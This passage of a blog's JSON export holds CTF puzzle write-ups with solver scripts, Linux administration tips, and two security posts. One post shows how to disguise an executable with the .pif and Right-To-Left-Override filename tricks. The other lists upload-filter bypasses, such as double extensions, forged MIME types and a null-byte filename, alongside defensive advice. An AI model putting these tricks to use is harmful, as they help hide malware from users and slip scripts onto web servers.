by displaying it we have seen: ECW{3a2ef8a1. Now let's see where is the second part of the flag! This challenge seems to be a steganography one. Let's check a classic: LSB. Nothing in the picture so let's check the .wav. I found a writeup talking about LSB in a WAV file. Perfect it's using my favorite scripting language (Ruby) and this ruby gem. We used the same script as in the writup: 123456789101112131415#!/usr/bin/env rubyrequire 'wav-file'wav = open(\"hurry-overworld.wav\")format = WavFile::readFormat(wav)# puts formatchunk = WavFile::readDataChunk(wav)wav.closewavs = chunk.data.unpack('s*')lsb = wavs.map&#123;|sample| sample[0]&#125;.joinflag = lsb[(lsb.index('1'))..-1]puts [flag].pack('b*') Here is what we retrived we the script: 123456[noraj@rawsec]––––––––––––––––––––––––––––––––––––––––––––––––––[~/CTF/ECW/2016]$ ./mario-wav-lsb.rb &gt; out[noraj@rawsec]––––––––––––––––––––––––––––––––––––––––––––––––––[~/CTF/ECW/2016]$ file outout: PNG image data, 900 x 675, 8-bit/color RGBA, non-interlaced Display the new image and get the second part of the flag: ccf280865a1ef96bdb0c901c}. Flag: ECW{3a2ef8a1ccf280865a1ef96bdb0c901c}.","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"misc","slug":"misc","permalink":"https://rawsec.ml/tags/misc/"}]},{"title":"Hack The Vote 2016 - 250 - Trump likes colors - Steganography","slug":"Hack-The-Vote-2016-250-trump-likes-colors","date":"2016-11-04T23:00:00.000Z","updated":"2017-02-07T18:23:37.368Z","comments":true,"path":"en/Hack-The-Vote-2016-250-trump-likes-colors/","link":"","permalink":"https://rawsec.ml/en/Hack-The-Vote-2016-250-trump-likes-colors/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : Hack The Vote 2016 Website : https://pwn.voting/ Type : Online Format : Jeopardy CTF Time : link Description Somebody leAked TrumP's favorite colors, looks like they used a really esoteric format. Some chiNese hacker named &quot;DanGer Mouse&quot; provided us the leak, getting this crucial info could really sway voters at the polls! trump_likes_colors.png author's irc nick: nihliphobe Note: This challenge was classified as Forensics but is Steganography. Solution TL;DR : this is a incomplete solving, we didn't go until the end of this challenge. The description is talking about DanGer Mouse, search for it, it looks like a website about esoteric languages and algorithms (http://www.dangermouse.net/esoteric/). Look at the histogram of the image: 12345678910111213141516[noraj@rawsec]––––––––––––––––––––––––––––––––––––––––[~/CTF/Hack_The_Vote/2016]$ convert trump_likes_colors.png histogram:- | identify -format %c - 249552: ( 0, 0, 0) #000000 black 1: ( 0, 0,192) #0000C0 srgb(0,0,192) 102: ( 0, 0,255) #0000FF blue 1: ( 0,192, 0) #00C000 srgb(0,192,0) 1: ( 0,192,192) #00C0C0 srgb(0,192,192) 48: ( 0,255, 0) #00FF00 lime 48: ( 0,255,255) #00FFFF cyan 2: (192, 0, 0) #C00000 srgb(192,0,0) 1: (192, 0,192) #C000C0 srgb(192,0,192) 1: (192,192, 0) #C0C000 srgb(192,192,0) 83: (255, 0, 0) #FF0000 red 103: (255, 0,255) #FF00FF magenta 51: (255,255, 0) #FFFF00 yellow 6: (255,255,255) #FFFFFF white The colors used seem to be only the ones used in PIET language. There is a programm implementing PIET: npiet, we used it to run the programm. N.B.: As we can see in the gallery. Vertical lines are an easy way to store a string, so our image must contain a string with the favorite color of Trump. 123[noraj@rawsec]––––––––––––––––––––––––––––––––––––––––[~/CTF/Hack_The_Vote/2016]$ npiet trump_likes_colors.png#ff0000 So the programm gave us the favorite color of Trump: #ff0000 = Red = rgb(255, 0, 0) = hsl(0, 100%, 50%). The description let us think that was that we were looking for but IRC moderators told us that was not the end. So I checked the trace of the programm: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576[noraj@rawsec]––––––––––––––––––––––––––––––––––––––––[~/CTF/Hack_The_Vote/2016]$ npiet -t trump_likes_colors.pngtrace: step 0 (0,0/r,l nR -&gt; 1,0/r,l dR):action: push, value 35trace: stack (1 values): 35trace: step 1 (1,0/r,l dR -&gt; 2,0/r,l nM):action: out(char)#trace: stack is emptytrace: step 2 (2,0/r,l nM -&gt; 3,0/r,l dM):action: push, value 102trace: stack (1 values): 102trace: step 3 (3,0/r,l dM -&gt; 4,0/r,l nB):action: out(char)ftrace: stack is emptytrace: step 4 (4,0/r,l nB -&gt; 5,0/r,l dB):action: push, value 102trace: stack (1 values): 102trace: step 5 (5,0/r,l dB -&gt; 6,0/r,l nC):action: out(char)ftrace: stack is emptytrace: step 6 (6,0/r,l nC -&gt; 7,0/r,l dC):action: push, value 48trace: stack (1 values): 48trace: step 7 (7,0/r,l dC -&gt; 8,0/r,l nG):action: out(char)0trace: stack is emptytrace: step 8 (8,0/r,l nG -&gt; 9,0/r,l dG):action: push, value 48trace: stack (1 values): 48trace: step 9 (9,0/r,l dG -&gt; 10,0/r,l nY):action: out(char)0trace: stack is emptytrace: step 10 (10,0/r,l nY -&gt; 11,0/r,l dY):action: push, value 48trace: stack (1 values): 48trace: step 11 (11,0/r,l dY -&gt; 12,0/r,l nR):action: out(char)0trace: stack is emptytrace: step 12 (12,0/r,l nR -&gt; 13,0/r,l dR):action: push, value 48trace: stack (1 values): 48trace: step 13 (13,0/r,l dR -&gt; 14,0/r,l nM):action: out(char)0trace: stack is emptytrace: entering white block at 16,0 (like the perl interpreter would)...trace: step 14 (14,0/r,l nM -&gt; 16,0/r,l WW):trace: special case: we at a white codel - continuingtrace: entering white block at 16,3 (like the perl interpreter would)...trace: step 15 (16,0/r,l WW -&gt; 16,3/d,r WW):trace: special case: we at a white codel - continuingtrace: white cell(s) crossed - continuing with no command at 14,3...trace: step 16 (16,3/d,r WW -&gt; 14,3/l,l nY): Seems there is nothing interesting. I also genererated the image trace: That only show us that char as pushed one by one, and there is not loop or conditional statements. So maybe there was something to do with the capital letters in the description?","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"stegano","slug":"stegano","permalink":"https://rawsec.ml/tags/stegano/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"Hack The Vote 2016 - 50 - TOPKEK - Misc","slug":"Hack-The-Vote-2016-50-topkek","date":"2016-11-04T23:00:00.000Z","updated":"2017-02-07T18:23:37.368Z","comments":true,"path":"en/Hack-The-Vote-2016-50-topkek/","link":"","permalink":"https://rawsec.ml/en/Hack-The-Vote-2016-50-topkek/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : Hack The Vote 2016 Website : https://pwn.voting/ Type : Online Format : Jeopardy CTF Time : link Description A CNN reporter had only one question that she couldn't get off her mind Do we even know, who is this 4 CHAN??? So she set out to find who this 400lb hacker is. During her investigation, she came across this cryptic message on some politically incorrect forum online, can you figure out what it means? kek author's irc nick: krx Note: This challenge was classified as Crypto but is Misc. Solution The content of the file looks like this: 12KEK! TOP!! KEK!! TOP!! KEK!! TOP!! KEK! TOP!! KEK!!! TOP!! KEK!!!! TOP! KEK! TOP!! KEK!! TOP!!! KEK! TOP!!!! KEK! TOP!! KEK! TOP! KEK! TOP! KEK! TOP! KEK!!!! TOP!! KEK!!!!! TOP!![...] This looks like an esoteric language (like Ook) but it's not. N.B.: According to 1, 2 and 3, kek is derivated of lel that is a derivated of lol, and topkek is a cake trademark popular on /s4s chan of 4Chan because of its similarity with toplel which means super funny. (Knowing that is useless for the challenge). There is only two keyword TOP and KEK and they seem pretty useless. So let's assume that it is binary: (TOP = 0 &amp;&amp; KEK = 1) or (TOP = 1 &amp;&amp; KEK = 0). We noticed there is between 1 and 5 exclamation marks following each keywords so let's assume that is the number of times that 0 or 1 is repeated. Here is my script: 12345678910111213141516171819202122232425#!/usr/bin/env ruby# read the filefile = File.open('kek.txt', 'r+t')data = file.readfile.closeputs \"Original: \\n\" + data + \"\\n\\n\"# Assume that TOP = 1, KEK = 0, and ! the number of time they appeartopkek_to_binary = \"\"data.split(\" \").each do |bool| if bool.match(/TOP/) marks = bool.sub('TOP', '') # keeping only the marks bin = marks.gsub('!', '1') # replacing marks with 0 topkek_to_binary.concat(bin) elsif bool.match(/KEK/) marks = bool.sub('KEK', '') # keeping only the marks bin = marks.gsub('!', '0') # replacing marks with 0 topkek_to_binary.concat(bin) endendputs \"Binary: \\n\" + topkek_to_binary + \"\\n\\n\"# Let's convert it into ASCIIputs \"ASCII: \\n\" + [topkek_to_binary].pack(\"B*\") Here is the output of the script: 12345678Originalinaryflag&#123;T0o0o0o0o0P______1m_h4V1nG_FuN_r1gHt_n0W_4R3_y0u_h4v1ng_fun______K3K!!!&#125;","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"misc","slug":"misc","permalink":"https://rawsec.ml/tags/misc/"}]},{"title":"Python 3 \"No module named SimpleHTTPServer\"","slug":"python-3-simplehttpserver","date":"2016-10-20T22:00:00.000Z","updated":"2017-02-07T18:23:36.768Z","comments":true,"path":"en/python-3-simplehttpserver/","link":"","permalink":"https://rawsec.ml/en/python-3-simplehttpserver/","excerpt":"","text":"If the default python on your machine is python 3 so running the following command will result an error: 12$ python -m SimpleHTTPServerpython: No module named SimpleHTTPServer So use instead: 1python -m http.server The python 2.7 doc warns: Note : The SimpleHTTPServer module has been merged into http.server in Python 3. The 2to3 tool will automatically adapt imports when converting your sources to Python 3. You can also check the python 3.5 doc. Note that on some machines python redirects to python 2 and on some others to python 3, so if you want a command that always works use python3 -m http.server or python2 -m SimpleHTTPServer.","categories":[{"name":"programming","slug":"programming","permalink":"https://rawsec.ml/categories/programming/"},{"name":"python","slug":"programming/python","permalink":"https://rawsec.ml/categories/programming/python/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/tags/linux/"},{"name":"programming","slug":"programming","permalink":"https://rawsec.ml/tags/programming/"},{"name":"python","slug":"python","permalink":"https://rawsec.ml/tags/python/"}]},{"title":"ArchLinux - Temporarily resize /tmp partition","slug":"archlinux-temporarily-resize-tmp-partition","date":"2016-10-14T22:00:00.000Z","updated":"2017-02-07T18:23:36.662Z","comments":true,"path":"en/archlinux-temporarily-resize-tmp-partition/","link":"","permalink":"https://rawsec.ml/en/archlinux-temporarily-resize-tmp-partition/","excerpt":"","text":"Context tmpfs is a temporary file system that resides in memory and/or swap partition(s). tmpfs is commonly used for /tmp. By default, a tmpfs has its maximum size set to half the total of RAM. Note that the actual memory/swap consumption depends on how much you fill it up, as tmpfs partitions do not consume any memory until it is actually needed. Problem example: You want to build an Android development lab in a VM. You set VM RAM to 2GB. So by default, /tmp size will be 1GB. You begin to install Android Studio but an error occured, telling you that there is not enough space on the disk. That's because /tmp is too small to contain all temporary downloads of Android Studio during the install process. Fix For a problem like the prvious example, we don't want to do a permanent change as that's just a punctual need. So to fix the problem we'll temporarily increase the size of /tmp. It is posible because in our example the VM has 2GB RAM + 4GB SWAP, so we can increase a tmpfs partition up to 6GB. Before the resizing: 123$ df /tmp Filesystem 1K-blocks Used Available Use% Mounted ontmpfs 1048576 84 1048492 1% /tmp Temporary resize: 1mount -o remount,size=4G,noatime /tmp After the resizing: 123$ df /tmpFilesystem 1K-blocks Used Available Use% Mounted ontmpfs 4194304 80 4194224 1% /tmp","categories":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/categories/linux/"},{"name":"archlinux","slug":"linux/archlinux","permalink":"https://rawsec.ml/categories/linux/archlinux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/tags/linux/"},{"name":"archlinux","slug":"archlinux","permalink":"https://rawsec.ml/tags/archlinux/"}]},{"title":"Setup a proxy under Linux","slug":"proxy-linux","date":"2016-10-12T22:00:00.000Z","updated":"2017-02-07T18:23:37.128Z","comments":true,"path":"en/proxy-linux/","link":"","permalink":"https://rawsec.ml/en/proxy-linux/","excerpt":"","text":"Environment variables Lot of programs (such as wget, curl, pacman, ...) use environment variables to determine the proxy of a given protocol. Environment variables can be added per user in their .bashrc or .zshrc shell profile file with something like export KEY=value. The advantage is that variables can be used in order to avoid repeating the same proxy several times. Or /etc/environment file stores the system-wide variables initialized upon user login. Or you can use /etc/syconfig/proxy under openSUSE. To add proxy settings one time for everyone, you can execute the following script with sudo privilege (because you need to write into a system file: /etc/environment). 123456789101112131415161718192021222324#!/bin/bashfile=/etc/environmenthttp_proxy=http://proxy.example.org:8080/HTTP_PROXY=$http_proxyhttps_proxy=$http_proxyHTTPS_PROXY=$https_proxyftp_proxy=$http_proxyFTP_PROXY=$ftp_proxyrsync_proxy=$http_proxyRSYNC_PROXY=$rsync_proxyno_proxy=\"localhost,127.0.0.1,localaddress,.localdomain.com\"NO_PROXY=$no_proxyecho \"http_proxy=$http_proxy\" &gt;&gt; $fileecho \"HTTP_PROXY=$HTTP_PROXY\" &gt;&gt; $fileecho \"https_proxy=$https_proxy\" &gt;&gt; $fileecho \"HTTPS_PROXY=$HTTPS_PROXY\" &gt;&gt; $fileecho \"ftp_proxy=$ftp_proxy\" &gt;&gt; $fileecho \"FTP_PROXY=$FTP_PROXY\" &gt;&gt; $fileecho \"rsync_proxy=$rsync_proxy\" &gt;&gt; $fileecho \"RSYNC_PROXY=$RSYNC_PROXY\" &gt;&gt; $fileecho \"no_proxy=$no_proxy\" &gt;&gt; $fileecho \"NO_PROXY=$NO_PROXY\" &gt;&gt; $file Proxy settings on GNOME3 Some other graphical programs (such as Chromium or Rhythmbox) ignore those environment variables and use gnome (GTK3) settings. These settings can be modified through the gnome-control-center front end and also through gsettings (see the example below). 12345678gsettings set org.gnome.system.proxy mode &apos;manual&apos;gsettings set org.gnome.system.proxy.http host &apos;proxy.example.org&apos;gsettings set org.gnome.system.proxy.http port 8080gsettings set org.gnome.system.proxy.ftp host &apos;proxy.example.org&apos;gsettings set org.gnome.system.proxy.ftp port 8080gsettings set org.gnome.system.proxy.https host &apos;proxy.example.org&apos;gsettings set org.gnome.system.proxy.https port 8080gsettings set org.gnome.system.proxy ignore-hosts &quot;[&apos;localhost&apos;, &apos;127.0.0.0/8&apos;, &apos;10.0.0.0/8&apos;, &apos;192.168.0.0/16&apos;, &apos;172.16.0.0/12&apos; , &apos;*.localdomain.com&apos; ]&quot; Package managers Since you are using awesome tools like zypper (openSUSE) or pacman (ArchLinux) you will probably don't care about the following paragraph. But users of apt-get or aptitue will need an additional step to use their package manager working with a proxy. They will need to edit /etc/apt/apt.conf.d/proxy and include the following lines: 123Acquire::http::proxy &quot;http://proxy.example.org:8080/&quot;;Acquire::ftp::proxy &quot;ftp://proxy.example.org:8080/&quot;;Acquire::https::proxy &quot;https://proxy.example.org:8080/&quot;;","categories":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/tags/linux/"},{"name":"system","slug":"system","permalink":"https://rawsec.ml/tags/system/"},{"name":"proxy","slug":"proxy","permalink":"https://rawsec.ml/tags/proxy/"}]},{"title":"2 less known tricks of spoofing extensions on Windows","slug":"2-less-known-tricks-spoofing-extensions","date":"2016-10-12T22:00:00.000Z","updated":"2017-02-07T18:23:37.308Z","comments":true,"path":"en/2-less-known-tricks-spoofing-extensions/","link":"","permalink":"https://rawsec.ml/en/2-less-known-tricks-spoofing-extensions/","excerpt":"","text":"Well-known tricks Malware often tries to hide itself from being an obvious executable. Windows malwares may: have crafted icons that are pretending to be real document files. use double extensions such as .pdf.exe or .doc.exe, this is effective because by default Windows hides the extension so not aware users wouldn't notice this an an executable as they are only seeing .pdf or .doc . use lesser known extensions of executable format like .scr. PIF extension This trick is very effective because it hides the real extension even if the extension hiding feature is disabled. The .pif extension is hidden and the original icon too but the file is still executable. PIF means Program Information file, historically it was used for DOS program and is not used today because there is no more DOS applications. But Creating a PIF file for a DOS-based program creates a shortcut to the program executable and all the settings saved in the PIF are contained in the shortcut. This trick was used in 2016 by a Petya/Mischa campaign in Poland. RTLO trick RTLO (Right To Left Override) trick uses the fact that some languages are being written from right side towards left but not the majority of countries. In order to support such languages, a Unicode character (U+202e) is used to do the switch between those two modes. It can be use maliciously, in order to displace the displayed extensions. You can use this site to see how it works. file.exe (unicode text) = \\u0066\\u0069\\u006c\\u0065\\u002e\\u0065\\u0078\\u0065 (unicode) Just add the \\u202e reverse character before the dot and you get: file‮.exe (unicode text) = \\u0066\\u0069\\u006c\\u0065\\u202e\\u002e\\u0065\\u0078\\u0065 (unicode) Now add the spoofed extension (e.g. txt works very well because its reverse is also txt): file‮txt.exe (unicode text) = \\u0066\\u0069\\u006c\\u0065\\u202e\\u0074\\u0078\\u0074\\u002e\\u0065\\u0078\\u0065 (unicode) We get a file.txt.exe that looks like fileexe.txt. Source: malwarebytes.com","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"windows","slug":"security/windows","permalink":"https://rawsec.ml/categories/security/windows/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"windows","slug":"windows","permalink":"https://rawsec.ml/tags/windows/"}]},{"title":"ArchLinux - Setup an SFTP user for Deluge","slug":"archlinux-setup-sftp-user-deluge","date":"2016-09-26T22:00:00.000Z","updated":"2017-02-07T18:23:36.905Z","comments":true,"path":"en/archlinux-setup-sftp-user-deluge/","link":"","permalink":"https://rawsec.ml/en/archlinux-setup-sftp-user-deluge/","excerpt":"","text":"Requirement Deluge is already installed, configured and working. The deluge user looks like: deluge:x:125:125:Deluge user:/srv/deluge:/bin/false. A SSH server is already installed, configured and working. SFTP setup Create the sftp user and add it to the deluge group (this will allow him to access to /srv/deluge/): 1# useradd sftpuser -d /home/sftpuser -G deluge Modify the sshd config (/etc/ssh/sshd_config) and add this lines: 123456Match User sftpuser ChrootDirectory %h ForceCommand internal-sftp AllowTcpForwarding no PermitTunnel no X11Forwarding no Restart the sshd server: 1# systemctl restart sshd.service Change chroot directory rights, this is required or sftp won't let you connect. The home directory must be owned as root and not writable by another user or group. This includes the path leading to the directory. 1# chown root:root /home/sftpuser You won't be able to connect in sftp if your user have /bin/false shell as it's not defined in the /etc/shells. To disable normal ssh login, add /bin/false in /etc/shells and change sftpuser shell: 1# usermod -s /bin/false sftpuser Test ssh access: (access should be refuse if /bin/false is used) 1# ssh sftpuser@localhost -p $SSH_PORT$ Test sftp access: (sftp user should be placed in the chroot environment) 1# sftp -P $SSH_PORT$ sftpuser@localhost Create the torrent folder to let sftp user access to deluge download folder: 1# mkdir /home/sftpuser/torrent Give the torrent folder the appropriate rights: 1# chown sftpuser:sftpuser /home/sftpuser/torrent As sftpuser will be chrooted in his home directory (/home/sftpuser/) he won't be able to access /srv/deluge/Downloads even if he has rights (he is in deluge group) and a symbolic link like ln -s /srv/deluge/Downloads /home/sftpuser/deluge won't work because it is outside the chroot environment. For sftpuser accessing via sftp to the chroot environment, /home/sftpuser/ will be the root directory / so the symbolic link to /srv/deluge/Downloads will in fact be wrong as /home/sftpuser/srv/deluge/Downloads doesn't exist. We can't directly chroot sftpuser in /srv/deluge/Downloads because that will require to change the /srv/deluge/Downloads/ folder ownership to root:root and so deluge user won't be able to access it anymore. We must chroot sftp user because letting him access to the whole system would be a security issue. So we will give sftp user two home directory: one SFTP home that is locked down by root (/home/sftpuser/) and one home he can write to (/home/sftpuser/torrent/) so sshd will be satisfied and the system will remain secure. To do that, we will make the deluge folder (the writable home directory) appear as a subdirectory inside the SFTP home directory: 1# mount --bind /srv/deluge/Downloads /home/sftpuser/torrent We can also add this into /etc/fstab to make this configuration permanent even after a reboot: 1# echo &apos;/srv/deluge/Downloads /home/sftpuser/torrent none bind&apos; &gt;&gt; /etc/fstab SFTP user is now ready to access the deluge download folder via SFTP. Thanks to the great ArchLinux wiki.","categories":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/categories/linux/"},{"name":"archlinux","slug":"linux/archlinux","permalink":"https://rawsec.ml/categories/linux/archlinux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/tags/linux/"},{"name":"archlinux","slug":"archlinux","permalink":"https://rawsec.ml/tags/archlinux/"}]},{"title":"ArchLinux - Setup Deluge to use HTTPS","slug":"archlinux-setup-deluge-https","date":"2016-09-24T22:00:00.000Z","updated":"2017-02-07T18:23:36.918Z","comments":true,"path":"en/archlinux-setup-deluge-https/","link":"","permalink":"https://rawsec.ml/en/archlinux-setup-deluge-https/","excerpt":"","text":"Stop deluged torrent process: 1systemctl stop deluged.service Go into deluge ssl folder: 1cd /srv/deluge/.config/deluge/ssl Backup or remove the old certificate and key: 1mv daemon.cert daemon.cert.old &amp;&amp; mv daemon.pkey daemon.pkey.old Generate the new deluge certificate and key: 1openssl req -new -x509 -nodes -out deluge.cert.pem -keyout deluge.key.pem Answer questions for teh certificate. Be sure to give the right ownership to certificate and key: 1chown -R deluge:deluge /srv/deluge/.config/deluge/ssl Launch deluge web UI (User Interface) via http. Open the Preferences menu, select Interface tab and check Use SSL. Change Private Key into ssl/deluge.key.pem and Certificate into ssl/deluge.cert.pem. Click Apply and then Ok. Or instead of using the web UI, modify /srv/deluge/.config/deluge/web.conf (stopping deluge-web before is needed): &quot;https&quot;: true, &quot;pkey&quot;: &quot;ssl/deluge.key.pem&quot;, &quot;cert&quot;: &quot;ssl/deluge.cert.pem&quot;, Start deluged torrent process: 1systemctl start deluged.service Restart deluge-web UI: 1systemctl restart deluge-web.service Launch deluge web UI using https and enjoy.","categories":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/categories/linux/"},{"name":"archlinux","slug":"linux/archlinux","permalink":"https://rawsec.ml/categories/linux/archlinux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/tags/linux/"},{"name":"archlinux","slug":"archlinux","permalink":"https://rawsec.ml/tags/archlinux/"}]},{"title":"Common upload flaws","slug":"common-upload-flaws","date":"2016-09-20T22:00:00.000Z","updated":"2017-02-07T18:23:37.185Z","comments":true,"path":"en/common-upload-flaws/","link":"","permalink":"https://rawsec.ml/en/common-upload-flaws/","excerpt":"","text":"If a remote web server let you upload and execute scripts so this is beginning to turn turn bad. Here are some common upload flaws: extensions blacklist double extensions MIME type Null Byte Extensions blacklist Blacklists are a bad idea in security. For example if a server check that there is no .php file extension uploaded. Ok, you may upload a php script saved as .png but even if it is include or publicly available you won't be able to execute it. So what? Did you know that a php server also interpret .php2, .pwml, .phtml? Whit a blacklist, an administrator can forget to add them all. So to protect you, a better solution will be to establish a whitelist of authorized extension instead of a blacklist of forbidden ones. Double extensions A server is filtering authorized extensions and only .jpg, .gif, .jpeg, .png authorized. This kind of verification will only check the end extension with a regex matching what is after the dot in the filename. To bypass this just rename your files from file.php to file.php.png. In practice this is not so effective because the file have not the desired file extensions. To protect from this kind of attack don't trust filename, ignore them and rename the file with a hash. And before accepting it you may want to check what the file really is with the MIME type. Once uploaded on the server check again for example with file signature header and because it can be fake you can also you other methods. For example if you only allow png images use pngcheck to be sure that's really a png. MIME type If an attacker name is php script image.png and temper his request and modify the content type from application/octet-stream to image/png, how can you know that's not an image? As said previously, don't trust client side, check again server side. Null byte Double extensions works on the server but you can execute your script with an image extension? Let's fix that. Just usethe this old flaw: injection of a null byte, that will stop the php server reading the name of the file after the null byte. Name your script something like script.php%00.png and upload it. What's %00? It's the hexadecimal representation of the null byte encoded for http. How does it work? See my post about LFI, I talked about Null Byte injection. To protect yourself still the same recommendation: check server side. You also need to keep your PHP version up to date because that flaw was corrected. And a more smart name parsing will only be better.","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"web","slug":"web","permalink":"https://rawsec.ml/tags/web/"},{"name":"php","slug":"php","permalink":"https://rawsec.ml/tags/php/"}]},{"title":"CSAW CTF - 100 - Rgexepire - Misc","slug":"CSAW-2016-100-Regexpire-misc","date":"2016-09-17T22:00:00.000Z","updated":"2017-02-07T18:23:37.218Z","comments":true,"path":"en/CSAW-2016-100-Regexpire-misc/","link":"","permalink":"https://rawsec.ml/en/CSAW-2016-100-Regexpire-misc/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : CSAW CTF Qualification Round 2016 Website : https://ctf.csaw.io/ Type : Online Format : Jeopardy CTF Time : link Description I thought I found a perfect match but she ended up being my regEx girlfriend. nc misc.chal.csaw.io 8001 Solution It was very similar with ISolve from BackdoorCTF 2016. I made 3 scripts to solve this: In Python with rstr.xeger (inspired by p4) In Ruby with regexp-examples In Bash with exrex (simplified version) I flaged with the Python one, the Ruby one work well too and the Bash one work badly due to the dirty way exrex handle regex. Here a proof of success (after the end of the CTF) : 12345678to solve = &apos;(wolf|gazelle)*[V8xqjx0A8]+[AoqoYnDiu]i3b+[ukqUrDlf]xf+(tomato|elephant)*(clinton|tomato)&apos;solution = wolfgazellegazellegazellewolfwolfgazelle88xj8Ajx0xAjqx8xxAx8088AqVV0jV8Axjxx8qjV8x8qV0x8V0ii3bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbqxffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffftomatotomatoelephantelephanttomatoelephanttomatotomatoelephanttomatoelephanttomatoelephantelephantelephanttomatotomatotomatotomatoelephantelephanttomatotomatoelephantelephanttomatotomatoelephanttomatoelephantelephanttomatoelephanttomatotomatoD*[i-r]*(dolphin|sloth)(clinton|giraffe)[nNAUqCu]z4*\\d+DM*v&#123;9&#125;[e-j](fish|cat)(penguin|sloth)+(chair|clinton)&#123;7&#125;to solve = &apos;D*[i-r]*(dolphin|sloth)(clinton|giraffe)[nNAUqCu]z4*1+DM*v&#123;9&#125;[e-j](fish|cat)(penguin|sloth)+(chair|clinton)&#123;7&#125;&apos;solution = DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDmkpkoijmnrniprlknjppmmrjnlqqpjilrnqjmimkkmrndolphinclintonqz444444444444444444444444444444444444444444111111111111111111111111111111111111111111111111111111111111111111111111DMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMvvvvvvvvvhfishpenguinslothpenguinslothpenguinpenguinpenguinslothpenguinslothpenguinpenguinpenguinslothpenguinpenguinpenguinslothslothslothslothpenguinslothpenguinslothpenguinslothpenguinslothpenguinpenguinslothslothpenguinpenguinslothpenguinslothpenguinpenguinslothpenguinpenguinslothslothpenguinslothpenguinchairchairchairclintonchairclintonchairflag&#123;^regularly_express_yourself$&#125;to solve = &apos;flag&#123;^regularly_express_yourself$&#125;&apos;solution = flag&#123;regularly_express_yourself&#125; Python: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#!/usr/bin/env pythonimport rstrimport socketimport refrom time import sleepdef wrapper_reg(s): s = re.sub('[\\\\\\]&#123;1&#125;[W]&#123;1&#125;', ' ', s) s = re.sub('[\\\\\\]&#123;1&#125;[W]&#123;1&#125;', 'a', s) s = re.sub('[\\\\\\]&#123;1&#125;[d]&#123;1&#125;', '1', s) s = re.sub('[\\\\\\]&#123;1&#125;[D]&#123;1&#125;', '#', s) return s\"\"\"def wrapper(s): s = re.sub('\\s+', '\\t', s) s = re.sub('[^0-9a-zA-Z\\s]+', '#', s) return s\"\"\"def recvuntil(s): data = \"\" for i in range(9999): c = s.recv(1) if(c == '\\n'): break data += c return datadef main(): url = \"misc.chal.csaw.io\" port = 8001 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((url, port)) i = 0 while True: if i == 0: task = recvuntil(s) print(task) i = 1 task = recvuntil(s) print(task) to_solve = task if len(to_solve) == 0: print(task) elif(to_solve == 'Irregular' or to_solve == 'Timeout'): break else: to_solve = wrapper_reg(to_solve) print(\"to solve = '%s'\" % to_solve) solution = rstr.xeger(to_solve).replace('\\n','') #solution = wrapper(solution) print(\"solution = %s\" % solution) s.sendall(solution + \"\\n\") sleep(0.1)main() Ruby: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#!/usr/bin/env ruby### Dependencies ###require 'regexp-examples'require 'socket'### Functions ###def wrapper(s) s = s.gsub('\\s+', '\\t') s = s.gsub('[^0-9a-zA-Z\\s]+', '#') return send### Main ###if __FILE__ == $0 hostname = 'misc.chal.csaw.io' port = 8001 s = TCPSocket.open(hostname, port) output = \"\" exit_test = nil # pass Can you match these regexes? line = s.gets puts line.chop while not exit_test line = s.gets # Read lines from the socket puts line.chop # And print with platform line terminator output = output.concat(line) # stop = /Can you match these regexes?\\s+(.*)/.match(output) stop = true if stop reg_test = output.match(/(.*)/) reg = /#&#123;reg_test[1]&#125;/ example = reg.random_example example = wrapper(example) if example != nil puts \"solution :\" + example end s.puts(example.gsub('\\n', '')) s.flush output = \"\" end exit_test = /Failed regex/.match(output) if exit_test exit(1) end end s.close # Close the socket when doneend Bash: 